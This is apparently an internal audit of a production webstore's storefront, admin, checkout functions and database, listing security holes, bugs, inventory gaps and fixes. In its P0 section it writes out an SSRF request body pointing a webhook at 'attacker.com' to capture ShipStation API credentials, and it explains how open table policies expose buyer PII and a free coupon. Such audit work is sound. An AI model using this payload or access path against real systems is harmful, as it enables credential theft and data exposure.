# Webstore Flow Audit — 2026-06-10

Full front-to-back review of the native webstore: storefront (`src/storefront/`),
admin (`src/Webstores.js`), checkout/webhooks (`netlify/functions/`), schema
(migrations 011–036), and the **live database** (policies + advisors verified
via Supabase). Scope: gear (garment) inventory, transfer applications + number
inventory, checkout → SO batching → fulfillment flow, and efficiency.

**Context at audit time:** 5 stores (1 open, 3 OMG shadow), 60 orders,
231 order items, 1 active 100%-off coupon, 33 transfer rows, 985
product_inventory rows, ~27k adidas_inventory rows. This is live production.

---

## P0 — Security (live-confirmed, fix before anything else)

### 1. Every `webstore_*` table is publicly writable with the anon key
Confirmed in the live DB: all 11 webstore tables have `"Allow all" FOR ALL TO
public USING (true) WITH CHECK (true)` (the migration-011 dev placeholder that
was never hardened — the migration itself says "HARDENING REQUIRED BEFORE
PUBLIC LAUNCH"). Supabase advisors flag all 13. The storefront ships the anon
key to every visitor, so anyone can, from the browser console:

- **Read every order** — buyer names, emails, phones, home addresses (PII).
- **Update/delete any order** — totals, statuses, addresses, refund amounts.
- **Dump `webstore_coupons`** — the active 100%-off code is readable right
  now (`Storefront.js:681` even does this read client-side as the "preview").
- Tamper with claims, transfers, rosters, shipments.

Also: `adidas_inventory` has an **anon ALL** policy (public can corrupt vendor
stock), and `products` anon-read exposes cost columns (`nsa_cost`) to the
public.

**Fix shape** (keeps portal + storefront working):
- `authenticated` keeps full access (portal already runs authenticated — its
  RLS-error handling at App.js proves it).
- `anon`: SELECT only on `webstores` (open/closed, via a column-trimmed
  public view — `select('*')` at `Storefront.js:122` currently exposes
  director email/phone + ShipStation config), `webstore_storefront_products`,
  `webstore_bundle_items`; **no** anon access to orders/items/claims/coupons/
  shipments/transfers/roster.
- Order status reads + the buyer address edit (`Storefront.js:872`) move to a
  token-keyed action on `webstore-checkout` (service role), or a
  `SECURITY DEFINER get_order_by_token(token)` RPC. `OrderTrack.js` already
  uses `status_token` — same lookup server-side.
- Coupon preview becomes a `check_coupon` action on the checkout function
  (exact-match, returns kind/value only). Checkout already re-validates
  server-side, so nothing else changes.
- Drop `adidas_inventory` anon write; consider column grants on `products`.

### 2. ShipStation webhook leaks API credentials (SSRF)
`netlify/functions/shipstation-webhook.js:45-46` fetches the caller-supplied
`body.resource_url` with the ShipStation Basic-auth header attached. The
endpoint is unauthenticated, so anyone can POST
`{"resource_type":"SHIP_NOTIFY","resource_url":"https://attacker.com/x"}` and
capture the ShipStation key/secret. Fix: require the URL host to be
`ssapi.shipstation.com` before fetching (and ignore non-https).

---

## P1 — Correctness bugs

| # | Bug | Where |
|---|-----|-------|
| 1 | **Order-status page crashes** for ship-to-home orders that haven't shipped: `['shipped','complete'].includes(cur)` references undefined `cur` (should be a check on `curIdx`/line statuses). Buyers clicking the confirmation-email link hit a blank page. | `src/storefront/Storefront.js:856` |
| 2 | **"Print payout statement" crashes**: `AnalyticsTab` calls `printPayout(store, …)` but `store` is not among its props (`{orders, orderItems, stockByWp}`). | `src/Webstores.js:1610` vs `1567` |
| 3 | **Refunded orders still batch into Sales Orders**: `batchOrders` only excludes `pending_payment` and `cancelled`, so a fully-refunded order gets produced and shipped. | `src/Webstores.js:574` |
| 4 | **Number claims are never released**: cancel, refund, and order-item removal leave the `webstore_number_claims` row, so the number stays blocked for the rest of the store's life. Abandoned card checkouts (`pending_payment`) also hold their claims forever — a shopper can squat numbers by starting checkouts and bailing. No cleanup job, no admin "release number" control. | `webstore-checkout.js:232-244`, `Webstores.js:529` (refund), `Webstores.js:510` (edits) |
| 5 | **Duplicate numbers slip through in one checkout**: claims dedupe with `new Set(...)`, so a parent ordering two kids both as #10 in a unique-number store gets one claim and two #10 jerseys. Also `player_name` on the claim is the **buyer's** name, not the player's — the admin claims list misattributes numbers. | `webstore-checkout.js:233,236` |
| 6 | **`number_min`/`number_max` are never enforced** — not in the storefront input (digits + 3 chars only), not in checkout. Admin configures 0–99; a kid can order #999. | `Storefront.js:448`, `webstore-checkout.js:85` |
| 7 | **Ship-webhook marks lines shipped by SKU only** — a partial shipment of "M jersey" also flips the L jersey line (same SKU, different size) to shipped. Match on sku+size, or per-qty. | `shipstation-webhook.js:78` |
| 8 | **SO linkage isn't durable**: `batchOrders` immediately writes `so_id` + `status='batched'` to webstore orders, but `webstoreCreateSO` only creates the SO in React state — persistence happens later via the normal save path. If that save fails or the tab closes, orders are permanently linked to an SO that doesn't exist (and excluded from re-batching). Await actual DB persistence before linking, or create the SO server-side in one transaction. | `Webstores.js:639-641`, `App.js:5528` |
| 9 | Sales tax is hard-coded to 0 on every webstore order (column exists, TaxCloud is wired for invoices but never called here). Decide deliberately — right now it's silent. | `webstore-checkout.js:201-208` |

---

## P1 — Inventory truth (the core "does inventory work" question)

The model today: `product_inventory` (manual warehouse counts) + Adidas vendor
feed + open-PO ETA view, surfaced through `webstore_storefront_products`.
**Nothing ever subtracts webstore demand.** Stock shown to shoppers and checked
at checkout is the raw warehouse count until someone manually edits it.

Consequences:
- A store can sell 8 units of an item with 5 on hand over its window — every
  checkout sees "5 available" and passes (`checkStock` reads the same static
  view). The shortfall only surfaces at batch time (`Webstores.js:579-595`),
  after parents have paid.
- **One-size items skip stock checks entirely** (`checkStock` filters
  `l.kind === 'single' && l.size`) — hats, socks, balls, bags can oversell
  silently.
- **Bundle components are never stock-checked** at checkout, and the bundle
  PDP shows no stock/ETA state at all (`BundlePage` renders plain size
  buttons). Player kits are the main thing these stores sell — this is the
  biggest inventory blind spot.
- PDP size-disable uses **product-level** "incoming" — if any size has an open
  PO, every sold-out size stays orderable as backorder (`Storefront.js:437`).

**Recommended fix — committed-stock view, no write contention:**
create a `webstore_committed` view aggregating active demand
(`webstore_order_items` joined to orders with `status NOT IN
('cancelled','refunded','pending_payment')` and `line_status NOT IN
('shipped','complete')`), grouped by product_id + size. Subtract it in
`webstore_storefront_products` (e.g. expose `size_stock_available`). Then:
- storefront display, checkout `checkStock`, and the batch health check all
  tighten automatically,
- warehouse syncs stay the source of truth for physical counts (no clobber
  risk from decrementing on sale),
- extend `checkStock` to cover one-size lines and bundle components (the data
  is already loaded — it's a filter change plus component expansion).

Also worth doing in `webstore-checkout`: validate submitted `size` against the
product's `available_sizes` (tampered carts can currently inject arbitrary
size strings that flow into SOs and pick lines).

## P1 — Transfer (apps + numbers) inventory

The per-store heat-transfer system (designs deduct per unit; digits per
occurrence; on-hand → on-order → in-process lifecycle with pull sheets) is
genuinely good. Three improvements:

1. **Non-atomic pull**: `pullBatchTransfers` writes `on_hand: max(0, stale −
   need)` from client state — two staff pulling concurrently lose an update,
   and `max(0,…)` silently hides overshoot. Use an atomic decrement
   (`on_hand = on_hand − need` via RPC) and let negatives surface as alerts.
   (`Webstores.js:430-439`)
2. **Digit pools are per-store but the physical stock is shared**: "8in White
   digit 4" is the same goods in every store, yet each store tracks its own
   silo — counts drift from reality and reorders double-up. Consider a global
   number-transfer pool (per size/color/digit) that stores reference; design
   transfers stay per-store.
3. Transfer demand ignores `missing_qty`/cancelled lines only via order
   status — fine today, just keep it in mind if line-level cancellation lands.

---

## P2 — Promised-but-missing flow pieces

- **`so_creation` scheduling is a no-op.** The store form offers
  manual/on_close/daily/weekly but no scheduler exists anywhere (only the
  manual "Create Sales Order" button works). Either build the scheduled
  function (netlify.toml already has scheduled-function precedent:
  `ss-pricing-sync`) or remove the misleading options.
- **Stores don't auto-close.** `close_at` drives the countdown banner, but
  `isOpen` is purely `status === 'open'` — a store past its close date keeps
  taking orders until staff remember to flip it. An hourly scheduled function
  could close past-due stores **and** run on_close/daily/weekly batching in
  one place.
- **`require_login` is never enforced** by the storefront — "club members
  only" stores are fully public. Enforce or remove the toggle.
- **Two order-status pages.** The tokenless `OrderStatusPage` inside
  `Storefront.js` (crashes per bug #1, needs open RLS to work) duplicates the
  better token-based `OrderTrack.js` (richer stages, shipments, partials).
  Point the confirmation email (`_webstoreEmail.js:32`) at
  `/shop/order/<status_token>` and delete the in-storefront page — one page to
  maintain, and it makes the RLS lockdown trivial.
- Roster upload UI is still a stub ("coming in a later step",
  `Webstores.js:2152`) though the table + tab exist.

---

## P3 — Efficiency / polish

1. **`loadDetail` fetches the entire `webstore_order_items` table** (no
   filter!) and all `webstore_bundle_items`, then filters client-side — every
   store-detail open scans every order item across all stores, and grows with
   the OMG shadow stores too. Use PostgREST embedding
   (`webstore_orders.select('*, webstore_order_items(*)')`) or `.in('order_id',
   ids)`. (`Webstores.js:344,347`)
2. Storefront `load()` similarly fetches all bundle items platform-wide —
   `.in('bundle_id', bundleIds)` instead. (`Storefront.js:129`)
3. **Checkout as one RPC**: the order/items/claims insert with manual rollback
   (`webstore-checkout.js:200-244`) works but isn't atomic (a function crash
   mid-way strands rows) and costs 4–6 round trips. A single
   `place_webstore_order` Postgres function makes it transactional and faster,
   and the number-claim conflict comes back as one clean error.
4. **Coupon counter**: replace the 3-try CAS loop (`_webstoreEmail.js:75-86`)
   with `UPDATE webstore_coupons SET used_count = used_count + 1 WHERE id = …
   AND (max_uses IS NULL OR used_count < max_uses) RETURNING id` — atomic,
   also closes the over-redemption race two simultaneous checkouts can hit.
5. Cart UX: identical unpersonalized lines stack as separate rows
   (`addToCart` always appends); merge by product+size. Show "only N left"
   from the committed-stock view for urgency.
6. Numbers UX: the plan promised greyed-out taken numbers — today shoppers
   discover conflicts only at checkout failure. With claims locked behind RLS,
   expose a tiny `taken_numbers(store_id)` RPC returning just the numbers, and
   validate min/max in the picker.
7. Bundle page asks for the jersey number once per numbered component — a kit
   with numbered jersey + shorts can be submitted with mismatched numbers.
   Collect one number per package and copy it to `takes_number` components.
8. `reorderItem` rewrites the whole catalog's sort_order sequentially on every
   arrow click; swap just the two rows.
9. Zero e2e coverage for the storefront (12 specs, none touch `/shop`). A
   single Playwright flow — browse → bundle config → checkout (team-tab) →
   status page — would have caught bugs #1 and #6.
10. Dead columns: `webstore_orders.shipping` (superseded by `shipping_fee`),
    `webstores.fundraise_pct/fundraise_flat/fundraise_enabled` (model moved to
    per-item `fundraise_amount`). Worth a cleanup note so they don't confuse.

---

## Suggested sequencing

1. **RLS lockdown + token-based status page + server-side coupon check +
   ShipStation host allowlist** (P0 — one focused PR, storefront keeps working
   through the checkout function which already uses the service role).
2. **Crash/correctness fixes** (bugs 1–8 — small diffs, immediately shippable).
3. **Committed-stock view + checkout coverage for one-size/bundles** (makes
   inventory honest end-to-end).
4. **Scheduler function**: auto-close stores, on_close/daily/weekly batching,
   pending_payment + claim sweeper (one scheduled function covers all three).
5. **Atomic checkout RPC + claims lifecycle + transfer-pull atomicity.**
6. **Efficiency/UX batch** (query scoping, cart merge, number picker, e2e).
